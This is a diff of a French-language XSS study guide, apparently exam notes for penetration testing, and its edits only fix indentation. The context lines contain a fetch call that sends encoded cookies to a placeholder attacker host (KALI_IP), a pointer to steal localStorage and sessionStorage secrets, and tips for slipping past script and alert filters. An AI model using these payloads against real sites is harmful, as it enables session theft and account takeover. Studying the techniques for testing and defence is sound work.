@@ -139,7 +139,7 @@ fetch("http://KALI_IP/exfil?data=" + encodedCookie)
 ```
 
 !!! warning "HttpOnly"
-    Si le cookie est HttpOnly, `document.cookie` retourne vide.
+    Si le cookie est HttpOnly, `document.cookie` retourne vide.  
     **Chercher d'autres secrets** : localStorage, sessionStorage, DOM.
 
 ---
@@ -285,6 +285,6 @@ http://TARGET/app/?csv=NOUVEAU_BASE64
 ```
 
 !!! tip "Astuce exam"
-  Si `<script>` est bloqué → tester `<img src=x onerror=...>`  
-  Si `"` est encodé → tenter `'` ou sans guillemets  
-  Si le filtre bloque `alert` → tester `confirm(1)` ou `prompt(1)`
+    Si `<script>` est bloqué → tester `<img src=x onerror=...>`  
+    Si `"` est encodé → tenter `'` ou sans guillemets  
+    Si le filtre bloque `alert` → tester `confirm(1)` ou `prompt(1)`
